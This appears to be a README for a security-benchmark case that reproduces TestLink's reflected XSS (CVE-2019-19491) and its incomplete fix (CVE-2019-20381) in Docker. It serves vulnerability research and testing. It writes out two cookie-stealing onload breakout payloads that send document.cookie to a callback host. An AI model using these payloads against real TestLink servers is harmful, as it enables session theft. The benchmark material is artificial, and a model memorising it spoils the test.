# testlink-cve-2019-20381

V1 不完整修复的源码级分析见同目录 [INCOMPLETE_FIX_ANALYSIS.md](INCOMPLETE_FIX_ANALYSIS.md)。

TestLink (PHP test-case management) — **CVE-2019-19491 → CVE-2019-20381**, reflected XSS (CWE-79).
Canary kind: **xss-exfil** (headless Chromium victim + internal callback; flag = victim cookie secret).
Gate: **Variant A** (same sink). Status: **gate_passed** on real Docker (`run_mode: real-app-http`).

Runs the **REAL published TestLink** cloned at build time at each exact ref, on PHP 7.4 + Apache +
MariaDB, seeded with the real TestLink schema + default admin (`admin/admin`). The XSS is triggered
by an **external HTTP GET into the real `index.php`** — no source-lift, no hand-written reflection.

## Incomplete-fix mechanism
Sink: `index.php::initEnv()` reflects the `reqURI` query parameter **unescaped** into the main-frame
`src` in `main.tpl` (V0 `1.9.19`: a `<frameset>` `<frame src="{$gui->mainframe}">`, matching
ExploitDB 47702; V1/V2: `<iframe src="{$gui->mainframe}">`). The reflection renders only for an
**authenticated** session, so the victim logs in first (authenticated reflected XSS).

- **V0** (`1.9.19`): no guard → reqURI reflected raw.
- **V1** (CVE-2019-19491 fix, commit `0e3e90799`): `if (strpos($reqURI,'javascript') !== false) $reqURI = null;`
  — **case-SENSITIVE**. Also prepends `$_SESSION['basehref']`. Blocks the lowercase `javascript` token
  but a capitalised `Javascript` contains no lowercase `javascript` substring, so it survives. **Target.**
- **V2** (CVE-2019-20381 fix, commit `cde692895`, tag `1.9.20`): `strpos` → `stripos` (case-insensitive)
  → every case variant caught.

Because (a) modern Chromium blocks bare `javascript:` URLs in frame navigation and (b) the V1 fix's
`basehref` prepend turns a bare `Javascript:` reqURI into `http://host/Javascript:...`, the payload
executes via an **onload attribute-breakout** (the unescaped reflection lets a `"` close the `src`
attribute and add `onload="..."` to the same frame/iframe). onload is scheme-independent and works on
both the V0 `<frame>` and the V1/V2 `<iframe>`. The original and residual differ by **exactly one
character** (`javascript` vs `Javascript`) — the exact `strpos`→`stripos` delta.

## Payloads (benign — exfil the planted flag only)
- original (V0-executes, V1-blocked): `reqURI = javascript" onload="new Image().src='//callback:9000/c?f='+document.cookie`
- residual (V1-executes, V2-blocked): `reqURI = Javascript" onload="new Image().src='//callback:9000/c?f='+document.cookie`

## Run
```
PCB_FLAG=$(python3 -c 'import secrets;print("PCBFLAG_"+secrets.token_hex(16))')
docker compose --profile v0 --profile v1 --profile v2 up -d --build   # real TestLink; installer-equiv DB seed
PCB_FLAG=$PCB_FLAG python3 oracle.py --gate                            # {passed: true}
PCB_FLAG=$PCB_FLAG python3 oracle.py --probe bypass --version v2       # [] (residual closed on V2)
```
See `repro.log` for the full transcript. Teardown:
`PCB_FLAG=teardown docker compose --profile v0 --profile v1 --profile v2 down -v --rmi all`.

## Notes
- Each version seeds its **own** DB (`testlink_v0/v1/v2`) — a 1.9.19 app rejects a 1.9.20-seeded DB.
- `php-pcb.ini` sets `display_errors=Off` so legacy-1.9.19 warnings don't corrupt HTTP headers (which
  would stop the session cookie and block login). Neither touches TestLink code or the reqURI sink.
- **Stale, un-rm'd leftovers from the prior hand-written build (NOT referenced by compose/case.json):**
  `app.php`, `render.php`, `BUILD_TODO.md`, `__pycache__/`, `_heldout/__pycache__/`.
